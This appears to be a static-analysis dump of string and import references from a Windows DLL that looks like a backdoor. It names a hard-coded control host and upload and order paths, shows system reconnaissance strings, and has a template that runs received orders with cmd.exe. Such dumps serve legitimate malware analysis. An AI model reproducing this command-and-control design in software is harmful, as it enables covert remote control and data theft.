reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x10001712	0x1000d34c	string	0x100016d3	GetModuleFileNameExA
0x1000176e	0x1000d020	import	0x100016d3	KERNEL32.dll.OpenProcess
0x100017da	0x1000d33c	string	0x100016d3	ID: %d (%s)\r\n
0x100017fd	0x1000d058	import	0x100016d3	KERNEL32.dll.CloseHandle
0x1000183d	0x1000d398	string	0x10001824	*&~^%@0hh8979
0x10001891	0x10003b3c	string	0x10001824	j\fh
0x100018db	0x1000d008	import	0x10001824	KERNEL32.dll.Sleep
0x10001915	0x1000d398	string	0x100018ff	*&~^%@0hh8979
0x100019dd	0x1000d3f0	string	0x10001967	result
0x100019ef	0x1000d3e8	string	0x10001967	info
0x10001a04	0x10001a0d	string	0x10001967	SSSSh4
0x10001a11	0x1000d334	string	0x10001967	MyAgent
0x10001a16	0x1000d170	import	0x10001967	WININET.dll.InternetOpenA
0x10001a24	0x10011000	string	0x10001967	asdfghjk.host2.5y6.net
0x10001a30	0x1000d16c	import	0x10001967	WININET.dll.InternetConnectA
0x10001a43	0x10011108	string	0x10001967	/jd/upload.aspx
0x10001a4e	0x1000d318	string	0x10001967	%s?filepath=%s&filename=%s
0x10001a72	0x1000d00c	import	0x10001967	KERNEL32.dll.CreateFileA
0x10001a89	0x1000d3c8	string	0x10001967	\nFailed to open local file %s.
0x10001a93	0x1000d160	import	0x10001967	WININET.dll.InternetCloseHandle
0x10001aa2	0x1000d050	import	0x10001967	KERNEL32.dll.GetFileSize
0x10001aa8	0x1000d178	import	0x10001967	WININET.dll.HttpAddRequestHeadersA
0x10001ae2	0x1000d034	import	0x10001967	KERNEL32.dll.ReadFile
0x10001b6c	0x1000d030	import	0x10001967	KERNEL32.dll.MultiByteToWideChar
0x10001b97	0x1000d204	string	0x10001967	HTTP/1.1
0x10001ba3	0x1000d310	string	0x10001967	POST
0x10001bae	0x1000d168	import	0x10001967	WININET.dll.HttpOpenRequestA
0x10001bb4	0x10011000	string	0x10001967	asdfghjk.host2.5y6.net
0x10001bc5	0x1000d304	string	0x10001967	Host: %s
0x10001bf7	0x1000d2c0	string	0x10001967	Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
0x10001c28	0x1000d2a8	string	0x10001967	Accept-Language: en-us
0x10001c59	0x1000d284	string	0x10001967	Content-Type: multipart/form-data
0x10001c8a	0x1000d264	string	0x10001967	Accept-Encoding: gzip, deflate
0x10001cbb	0x1000d24c	string	0x10001967	Connection: Keep-Alive
0x10001cec	0x1000d234	string	0x10001967	Cache-Control: no-cache
0x10001d36	0x1000d164	import	0x10001967	WININET.dll.HttpSendRequestA
0x10001d6f	0x1000d164	import	0x10001967	WININET.dll.HttpSendRequestA
0x10001d7e	0x1000d008	import	0x10001967	KERNEL32.dll.Sleep
0x10001d96	0x1000d018	import	0x10001967	KERNEL32.dll.GetLastError
0x10001d9d	0x1000d3a8	string	0x10001967	\nReadFile failed on buffer %lu.
0x10001da4	0x1000d018	import	0x10001967	KERNEL32.dll.GetLastError
0x10001dab	0x1000d21c	string	0x10001967	\nSendRequest failed %lu
0x10001dd0	0x1000d018	import	0x10001967	KERNEL32.dll.GetLastError
0x10001dd7	0x1000d21c	string	0x10001967	\nSendRequest failed %lu
0x10001de9	0x1000d058	import	0x10001967	KERNEL32.dll.CloseHandle
0x10001df5	0x1000d160	import	0x10001967	WININET.dll.InternetCloseHandle
0x10001e3d	0x1000d190	import	0x10001e1c	WS2_32.dll.WSAStartup
0x10001e9c	0x1000d174	import	0x10001e1c	WININET.dll.InternetQueryOptionA
0x10001eab	0x1000d584	string	0x10001e1c	Get Proxy Failed
0x10001efe	0x1000d000	import	0x10001e1c	ADVAPI32.dll.GetUserNameA
0x10001f04	0x1000d054	import	0x10001e1c	KERNEL32.dll.GetOEMCP
0x10001f32	0x1000d084	import	0x10001e1c	KERNEL32.dll.GetVersionExA
0x10001faf	0x1000d18c	import	0x10001e1c	WS2_32.dll.gethostname
0x10001fbc	0x1000d188	import	0x10001e1c	WS2_32.dll.gethostbyname
0x10001fe1	0x1000d184	import	0x10001e1c	WS2_32.dll.inet_ntoa
0x1000201a	0x1000d04c	import	0x10001e1c	KERNEL32.dll.GetTempPathA
0x1000202a	0x1000d048	import	0x10001e1c	KERNEL32.dll.GetSystemDirectoryA
0x10002089	0x1000d508	string	0x10001e1c	HostName: %s\r\nIP: %s\r\nProxy: %s\r\nUser: %s\r\nSystemDir: %s\r\nOS Language Version: %d\r\nSystem Version: %d.%d %s (Build %d)\r\n\r\n
0x10002094	0x1000d4f4	string	0x10001e1c	\r\nProcess: \r\n
0x1000218d	0x1000d4e4	string	0x10001e1c	%s.jpg
0x100021a5	0x1000d4d8	string	0x10001e1c	%s/tmp.dat
0x100021bd	0x1000d4c8	string	0x10001e1c	%s/tmpxor.dat
0x100021fa	0x10004037	string	0x10001e1c	j\fh`
0x10002229	0x1000d4bc	string	0x10001e1c	%s/msuc.dat
0x100022a5	0x1000d3e8	string	0x10001e1c	info
0x100022cc	0x1000d044	import	0x10001e1c	KERNEL32.dll.DeleteFileA
0x100022df	0x1000d4ac	string	0x10001e1c	/jd/order/%s
0x100022f7	0x1000d49c	string	0x10001e1c	%s/order.dat
0x100023c9	0x1000d044	import	0x10001e1c	KERNEL32.dll.DeleteFileA
0x100023cf	0x1000d040	import	0x10001e1c	KERNEL32.dll.WideCharToMultiByte
0x100023fd	0x1000d494	string	0x10001e1c	cmd_
0x10002426	0x1000d48c	string	0x10001e1c	order
0x1000247a	0x1000d47c	string	0x10001e1c	%s/cmd%d.dat
0x100024ac	0x1000d464	string	0x10001e1c	%s\cmd.exe /c %s
0x100024ba	0x100024dd	string	0x10001e1c	jD_W
0x100024cf	0x1000d44c	string	0x10001e1c	%s\cmd.exe /c %s >%s
0x1000252a	0x1000d03c	import	0x10001e1c	KERNEL32.dll.CreateProcessA
0x10002539	0x1000d038	import	0x10001e1c	KERNEL32.dll.WaitForMultipleObjects
0x1000255a	0x1000d058	import	0x10001e1c	KERNEL32.dll.CloseHandle
0x1000257f	0x1000d058	import	0x10001e1c	KERNEL32.dll.CloseHandle
0x1000259a	0x1000d3f0	string	0x10001e1c	result
0x100025c1	0x1000d044	import	0x10001e1c	KERNEL32.dll.DeleteFileA
0x100025d1	0x1000d444	string	0x10001e1c	upload_
0x100025f4	0x1000d48c	string	0x10001e1c	order
0x1000266c	0x1000d434	string	0x10001e1c	/jd/uploads/%s
0x1000268b	0x1000d42c	string	0x10001e1c	uploads
0x100026a2	0x1000d420	string	0x10001e1c	download_
0x100026c5	0x1000d48c	string	0x10001e1c	order
0x10002780	0x1000d00c	import	0x10001e1c	KERNEL32.dll.CreateFileA
0x10002794	0x1000d3c8	string	0x10001e1c	\nFailed to open local file %s.
0x100027a5	0x1000d008	import	0x10001e1c	KERNEL32.dll.Sleep
0x100027b2	0x1000d050	import	0x10001e1c	KERNEL32.dll.GetFileSize
0x100027bf	0x1000d058	import	0x10001e1c	KERNEL32.dll.CloseHandle
0x100027df	0x1000d410	string	0x10001e1c	%s_%s_%d.jpg
0x1000280a	0x1000d404	string	0x10001e1c	downloads
0x10002831	0x1000d044	import	0x10001e1c	KERNEL32.dll.DeleteFileA
0x10002841	0x1000d3fc	string	0x10001e1c	code_
0x10002864	0x1000d48c	string	0x10001e1c	order
0x10002926	0x1000d008	import	0x10001e1c	KERNEL32.dll.Sleep
0x10002937	0x1000d180	import	0x10001e1c	WS2_32.dll.WSACleanup
0x100029c9	0x100029d8	string	0x100029a0	^[_3
0x10002f06	0x10002e3d	string	0x10002ef9	j\fh`
0x10003cfc	0x1000d08c	import	0x10003ce4	KERNEL32.dll.ExitThread
0x10003d71	0x1000d018	import	0x10003d46	KERNEL32.dll.GetLastError
0x10003d78	0x1000d08c	import	0x10003d46	KERNEL32.dll.ExitThread
0x10003d7e	0x1000d090	import	0x10003d46	KERNEL32.dll.GetCurrentThreadId
0x10003da3	0x10003d03	string	0x10003d46	j\fh@
0x10003e1e	0x1000d094	import	0x10003da9	KERNEL32.dll.CreateThread
0x10003e26	0x10003e44	string	0x10003da9	^_[]Ë blocks=Basic Latin,Latin-1 Supplement
0x10003e28	0x1000d018	import	0x10003da9	KERNEL32.dll.GetLastError
0x10003e7c	0x1000d098	import	0x10003e49	KERNEL32.dll.GetFileAttributesA
0x10003e87	0x1000d018	import	0x10003e49	KERNEL32.dll.GetLastError
0x100040ea	0x1000d0a0	import	0x100040b1	KERNEL32.dll.GetCommandLineA
0x100041cf	0x1000d09c	import	0x1000418a	KERNEL32.dll.DecodePointer
0x100041e4	0x1000d090	import	0x1000418a	KERNEL32.dll.GetCurrentThreadId
0x10004414	0x1000d0a4	import	0x100043fe	KERNEL32.dll.HeapFree
0x10004426	0x1000d018	import	0x100043fe	KERNEL32.dll.GetLastError
0x1000448a	0x1000d058	import	0x10004438	KERNEL32.dll.CloseHandle
0x10004494	0x1000d018	import	0x10004438	KERNEL32.dll.GetLastError
0x10004705	0x10004718	string	0x1000469f	9}\bu
0x1000487b	0x1000d0b0	import	0x10004791	KERNEL32.dll.IsDebuggerPresent
0x10004885	0x1000d0ac	import	0x10004791	KERNEL32.dll.SetUnhandledExceptionFilter
0x10004892	0x1000d0a8	import	0x10004791	KERNEL32.dll.UnhandledExceptionFilter
0x100048d0	0x1000d0bc	import	0x100048ba	KERNEL32.dll.GetCurrentProcess
0x100048d7	0x1000d0b8	import	0x100048ba	KERNEL32.dll.TerminateProcess
0x100048ea	0x1000d09c	import	0x100048df	KERNEL32.dll.DecodePointer
0x10004ab6	0x1000d0c0	import	0x10004a7e	KERNEL32.dll.EnterCriticalSection
0x10004ae9	0x1000d0c0	import	0x10004abf	KERNEL32.dll.EnterCriticalSection
0x10004b25	0x1000d0c4	import	0x10004af1	KERNEL32.dll.LeaveCriticalSection
0x10004b54	0x1000d0c4	import	0x10004b2d	KERNEL32.dll.LeaveCriticalSection
0x10004c49	0x10005df2	string	0x10004bc2	UVWS
0x10005065	0x1000d034	import	0x10004e71	KERNEL32.dll.ReadFile
0x1000511b	0x1000d034	import	0x10004e71	KERNEL32.dll.ReadFile
0x10005125	0x1000d018	import	0x10004e71	KERNEL32.dll.GetLastError
0x1000525f	0x1000d030	import	0x10004e71	KERNEL32.dll.MultiByteToWideChar
0x1000526c	0x1000d018	import	0x10004e71	KERNEL32.dll.GetLastError
0x10005341	0x1000d034	import	0x10004e71	KERNEL32.dll.ReadFile
0x1000534b	0x1000d018	import	0x10004e71	KERNEL32.dll.GetLastError
0x100053eb	0x1000d018	import	0x10004e71	KERNEL32.dll.GetLastError
0x100055b7	0x1000d5c4	string	0x10005593	Unknown exception
0x100056e0	0x1000d09c	import	0x100056d8	KERNEL32.dll.DecodePointer
0x1000575f	0x1000d0b4	import	0x100056d8	KERNEL32.dll.EncodePointer
0x1000576d	0x1000d0b4	import	0x100056d8	KERNEL32.dll.EncodePointer
0x1000579f	0x1000d0b4	import	0x100056d8	KERNEL32.dll.EncodePointer
0x10005803	0x100057bf	string	0x100057fb	j\fh(
0x10005857	0x1000d0c8	import	0x10005812	KERNEL32.dll.HeapAlloc
0x100058c0	0x1000d09c	import	0x100058b5	KERNEL32.dll.DecodePointer
0x1000591f	0x1000d0cc	import	0x100058dd	KERNEL32.dll.RaiseException
0x10005b01	0x1000d604	string	0x10005929	UTF-8
0x10005b20	0x1000d60c	string	0x10005929	UTF-16LE
0x10005b3f	0x1000d618	string	0x10005929	UNICODE
0x10005c7c	0x1000d0d0	import	0x10005bc0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10005ca5	0x1000d0c0	import	0x10005bc0	KERNEL32.dll.EnterCriticalSection
0x10005e2b	0x10005e36	string	0x10005e22	_^[]
0x10006014	0x1000a7f0	string	0x10005fb9	j\fh@
0x100067e0	0x1000d09c	import	0x100060e7	KERNEL32.dll.DecodePointer
0x10006d12	0x10006d5d	string	0x100060e7	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x10006d37	0x10006d5d	string	0x100060e7	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x10006d52	0x10006d5d	string	0x100060e7	X^_]ú blocks=Basic Latin,Latin-1 Supplement
0x10006d98	0x1000d0d8	import	0x100060e7	KERNEL32.dll.IsProcessorFeaturePresent
0x10006e61	0x1000d0b0	import	0x10006da8	KERNEL32.dll.IsDebuggerPresent
0x10006e76	0x1000d0ac	import	0x10006da8	KERNEL32.dll.SetUnhandledExceptionFilter
0x10006e81	0x1000d0a8	import	0x10006da8	KERNEL32.dll.UnhandledExceptionFilter
0x10006e9d	0x1000d0bc	import	0x10006da8	KERNEL32.dll.GetCurrentProcess
0x10006ea4	0x1000d0b8	import	0x10006da8	KERNEL32.dll.TerminateProcess
0x10007043	0x1000d0e8	import	0x10007036	KERNEL32.dll.GetStartupInfoW
0x10007077	0x100070af	string	0x10007036	SWf9M
0x10007147	0x100070eb	string	0x10007036	j@j
0x10007176	0x1000d0e4	import	0x10007036	KERNEL32.dll.GetFileType
0x100071ac	0x1000d0d0	import	0x10007036	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10007200	0x1000d0e0	import	0x10007036	KERNEL32.dll.GetStdHandle
0x10007212	0x1000d0e4	import	0x10007036	KERNEL32.dll.GetFileType
0x10007240	0x1000d0d0	import	0x10007036	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10007269	0x1000d0dc	import	0x10007036	KERNEL32.dll.SetHandleCount
0x1000729e	0x1000d0ec	import	0x1000727b	KERNEL32.dll.DeleteCriticalSection
0x100072fd	0x1000d0f0	import	0x100072ce	KERNEL32.dll.SetFilePointer
0x1000730a	0x1000d018	import	0x100072ce	KERNEL32.dll.GetLastError
0x10007419	0x1000d0b4	import	0x10007417	KERNEL32.dll.EncodePointer
0x10007420	0x1000d0f4	import	0x10007417	KERNEL32.dll.TlsAlloc
0x10007437	0x1000d0f8	import	0x10007429	KERNEL32.dll.TlsGetValue
0x10007452	0x1000d0f8	import	0x10007449	KERNEL32.dll.TlsGetValue
0x10007464	0x1000d09c	import	0x10007449	KERNEL32.dll.DecodePointer
0x10007473	0x1000d0fc	import	0x10007449	KERNEL32.dll.TlsSetValue
0x1000748e	0x1000d09c	import	0x1000747d	KERNEL32.dll.DecodePointer
0x100074ab	0x1000d09c	import	0x1000749a	KERNEL32.dll.DecodePointer
0x100074c5	0x1000d100	import	0x1000749a	KERNEL32.dll.TlsFree
0x100074e3	0x1000d69c	string	0x100074d7	KERNEL32.DLL
0x100074e8	0x1000d108	import	0x100074d7	KERNEL32.dll.GetModuleHandleW
0x10007529	0x1000d104	import	0x100074d7	KERNEL32.dll.InterlockedIncrement
0x1000758f	0x1000d018	import	0x1000758b	KERNEL32.dll.GetLastError
0x100075cb	0x1000d09c	import	0x1000758b	KERNEL32.dll.DecodePointer
0x100075e1	0x1000d090	import	0x1000758b	KERNEL32.dll.GetCurrentThreadId
0x100075f9	0x1000d10c	import	0x1000758b	KERNEL32.dll.SetLastError
0x100076bc	0x1000d110	import	0x1000761e	KERNEL32.dll.InterlockedDecrement
0x10007768	0x1000d0f8	import	0x1000774d	KERNEL32.dll.TlsGetValue
0x10007796	0x1000d09c	import	0x1000774d	KERNEL32.dll.DecodePointer
0x100077b3	0x1000d0fc	import	0x1000774d	KERNEL32.dll.TlsSetValue
0x100077be	0x1000d69c	string	0x100077bb	KERNEL32.DLL
0x100077c3	0x1000d108	import	0x100077bb	KERNEL32.dll.GetModuleHandleW
0x100077d9	0x1000d010	import	0x100077bb	KERNEL32.dll.GetProcAddress
0x100077df	0x1000d6d8	string	0x100077bb	FlsAlloc
0x100077e7	0x1000d6cc	string	0x100077bb	FlsGetValue
0x100077f4	0x1000d6c0	string	0x100077bb	FlsSetValue
0x10007801	0x1000d6b8	string	0x100077bb	FlsFree
0x10007815	0x1000d0fc	import	0x100077bb	KERNEL32.dll.TlsSetValue
0x1000785c	0x1000d0f4	import	0x100077bb	KERNEL32.dll.TlsAlloc
0x1000788c	0x1000d0b4	import	0x100077bb	KERNEL32.dll.EncodePointer
0x100078c9	0x1000d09c	import	0x100077bb	KERNEL32.dll.DecodePointer
0x1000791b	0x1000d090	import	0x100077bb	KERNEL32.dll.GetCurrentThreadId
0x1000793b	0x1000d6f4	string	0x10007936	mscoree.dll
0x10007940	0x1000d108	import	0x10007936	KERNEL32.dll.GetModuleHandleW
0x1000794a	0x1000d6e4	string	0x10007936	CorExitProcess
0x10007950	0x1000d010	import	0x10007936	KERNEL32.dll.GetProcAddress
0x10007972	0x1000d114	import	0x10007961	KERNEL32.dll.ExitProcess
0x100079c9	0x100079da	string	0x100079be	;u\fr
0x10007abd	0x1000d09c	import	0x10007a79	KERNEL32.dll.DecodePointer
0x10007c48	0x10007d42	string	0x10007bfc	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10007c59	0x10007d42	string	0x10007bfc	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10007d87	0x1000d008	import	0x10007d66	KERNEL32.dll.Sleep
0x10007dd3	0x1000d008	import	0x10007dab	KERNEL32.dll.Sleep
0x10007e21	0x1000d008	import	0x10007df7	KERNEL32.dll.Sleep
0x10007f55	0x1000d11c	import	0x10007e45	KERNEL32.dll.GetConsoleMode
0x10007f75	0x1000d118	import	0x10007e45	KERNEL32.dll.GetConsoleCP
0x10008065	0x1000d040	import	0x10007e45	KERNEL32.dll.WideCharToMultiByte
0x1000808e	0x1000d02c	import	0x10007e45	KERNEL32.dll.WriteFile
0x100080e7	0x1000d02c	import	0x10007e45	KERNEL32.dll.WriteFile
0x10008255	0x1000d02c	import	0x10007e45	KERNEL32.dll.WriteFile
0x1000832f	0x1000d02c	import	0x10007e45	KERNEL32.dll.WriteFile
0x100083ff	0x1000d040	import	0x10007e45	KERNEL32.dll.WideCharToMultiByte
0x10008430	0x1000d02c	import	0x10007e45	KERNEL32.dll.WriteFile
0x10008446	0x1000d018	import	0x10007e45	KERNEL32.dll.GetLastError
0x10008487	0x1000d02c	import	0x10007e45	KERNEL32.dll.WriteFile
0x100084a6	0x1000d018	import	0x10007e45	KERNEL32.dll.GetLastError
0x100088b8	0x1000d120	import	0x1000888c	KERNEL32.dll.GetModuleFileNameA
0x10008951	0x1000d128	import	0x10008947	KERNEL32.dll.GetEnvironmentStringsW
0x10008979	0x1000d040	import	0x10008947	KERNEL32.dll.WideCharToMultiByte
0x100089c5	0x1000d124	import	0x10008947	KERNEL32.dll.FreeEnvironmentStringsW
0x100089d1	0x1000d124	import	0x10008947	KERNEL32.dll.FreeEnvironmentStringsW
0x10008a33	0x1000d12c	import	0x10008a2a	KERNEL32.dll.HeapCreate
0x10008a4e	0x1000d130	import	0x10008a48	KERNEL32.dll.HeapDestroy
0x10008a93	0x1000d13c	import	0x10008a5c	KERNEL32.dll.GetSystemTimeAsFileTime
0x10008a9f	0x1000d024	import	0x10008a5c	KERNEL32.dll.GetCurrentProcessId
0x10008aa7	0x1000d090	import	0x10008a5c	KERNEL32.dll.GetCurrentThreadId
0x10008aaf	0x1000d138	import	0x10008a5c	KERNEL32.dll.GetTickCount
0x10008abb	0x1000d134	import	0x10008a5c	KERNEL32.dll.QueryPerformanceCounter
0x10008b4e	0x1000d140	import	0x10008af7	KERNEL32.dll.SetStdHandle
0x10008b5c	0x10008b74	string	0x10008af7	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10008bd4	0x1000d140	import	0x10008b78	KERNEL32.dll.SetStdHandle
0x10008be2	0x10008bf9	string	0x10008b78	_^[]Ë blocks=Basic Latin,Latin-1 Supplement
0x10008cb1	0x1000d0d0	import	0x10008c67	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10008ce9	0x1000d0c0	import	0x10008c67	KERNEL32.dll.EnterCriticalSection
0x10008d25	0x1000d0c4	import	0x10008d06	KERNEL32.dll.LeaveCriticalSection
0x10008d76	0x10008e35	string	0x10008d2d	j@j
0x10008dbc	0x1000d0d0	import	0x10008d2d	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10008de1	0x1000d0c0	import	0x10008d2d	KERNEL32.dll.EnterCriticalSection
0x10008dee	0x1000d0c4	import	0x10008d2d	KERNEL32.dll.LeaveCriticalSection
0x10008f47	0x1000d144	import	0x10008ec6	KERNEL32.dll.FlushFileBuffers
0x10008f51	0x1000d018	import	0x10008ec6	KERNEL32.dll.GetLastError
0x10008fc7	0x1000d0d0	import	0x10008f9f	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10008fec	0x1000d0ec	import	0x10008f9f	KERNEL32.dll.DeleteCriticalSection
0x1000904f	0x1000d0c4	import	0x10009040	KERNEL32.dll.LeaveCriticalSection
0x100090cf	0x1000d0d0	import	0x10009057	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10009143	0x1000d0c0	import	0x10009119	KERNEL32.dll.EnterCriticalSection
0x100091b3	0x1000d0ec	import	0x10009154	KERNEL32.dll.DeleteCriticalSection
0x10009263	0x1000926f	string	0x10009230	_^[]
0x100093c7	0x1000d0f0	import	0x10009385	KERNEL32.dll.SetFilePointer
0x100093d4	0x1000d018	import	0x10009385	KERNEL32.dll.GetLastError
0x10009683	0x1000d148	import	0x10009658	KERNEL32.dll.HeapSize
0x1000971b	0x1000e16c	string	0x100096b1	Runtime Error!\n\nProgram:
0x1000974d	0x1000d14c	import	0x100096b1	KERNEL32.dll.GetModuleFileNameW
0x1000975c	0x1000e13c	string	0x100096b1	<program name unknown>
0x100097e3	0x1000e0e0	string	0x100096b1	Microsoft Visual C++ Runtime Library
0x100097ff	0x1000d0e0	import	0x100096b1	KERNEL32.dll.GetStdHandle
0x1000984b	0x1000d02c	import	0x100096b1	KERNEL32.dll.WriteFile
0x100098df	0x10009fc2	string	0x10009899	SSSSS
0x1000a0e5	0x1000a10d	string	0x1000a0b1	9]\bu&
0x1000a44b	0x1000a458	string	0x1000a440	]_^[
0x1000a681	0x1000d150	import	0x1000a660	KERNEL32.dll.GetCPInfo
0x1000a8bd	0x1000d054	import	0x1000a894	KERNEL32.dll.GetOEMCP
0x1000a8e0	0x1000d154	import	0x1000a894	KERNEL32.dll.GetACP
0x1000a983	0x1000d080	import	0x1000a910	KERNEL32.dll.IsValidCodePage
0x1000a996	0x1000d150	import	0x1000a910	KERNEL32.dll.GetCPInfo
0x1000ab13	0x1000a7f0	string	0x1000aaf9	j\fh@
0x1000ab6f	0x1000d110	import	0x1000aaf9	KERNEL32.dll.InterlockedDecrement
0x1000ab8e	0x1000d104	import	0x1000aaf9	KERNEL32.dll.InterlockedIncrement
0x1000ac26	0x1000d110	import	0x1000aaf9	KERNEL32.dll.InterlockedDecrement
0x1000acb8	0x1000d104	import	0x1000acb1	KERNEL32.dll.InterlockedIncrement
0x1000ad53	0x1000d110	import	0x1000ad40	KERNEL32.dll.InterlockedDecrement
0x1000aff8	0x1000d0b4	import	0x1000afec	KERNEL32.dll.EncodePointer
0x1000b1ff	0x1000b248	string	0x1000b1d0	+D$\b\eT$\f
0x1000b2a3	0x1000d0b4	import	0x1000b29e	KERNEL32.dll.EncodePointer
0x1000b30a	0x1000d09c	import	0x1000b304	KERNEL32.dll.DecodePointer
0x1000b3c3	0x1000d09c	import	0x1000b311	KERNEL32.dll.DecodePointer
0x1000b515	0x1000d0c8	import	0x1000b4d2	KERNEL32.dll.HeapAlloc
0x1000b593	0x1000d078	import	0x1000b554	KERNEL32.dll.HeapReAlloc
0x1000b633	0x1000d074	import	0x1000b601	KERNEL32.dll.WriteConsoleW
0x1000b814	0x1000ecd8	string	0x1000b7de	USER32.DLL
0x1000b819	0x1000d07c	import	0x1000b7de	KERNEL32.dll.LoadLibraryW
0x1000b829	0x1000d010	import	0x1000b7de	KERNEL32.dll.GetProcAddress
0x1000b82f	0x1000eccc	string	0x1000b7de	MessageBoxW
0x1000b83f	0x1000d0b4	import	0x1000b7de	KERNEL32.dll.EncodePointer
0x1000b848	0x1000ecbc	string	0x1000b7de	GetActiveWindow
0x1000b858	0x1000eca8	string	0x1000b7de	GetLastActivePopup
0x1000b868	0x1000ec8c	string	0x1000b7de	GetUserObjectInformationW
0x1000b881	0x1000ec74	string	0x1000b7de	GetProcessWindowStation
0x1000b899	0x1000d09c	import	0x1000b7de	KERNEL32.dll.DecodePointer
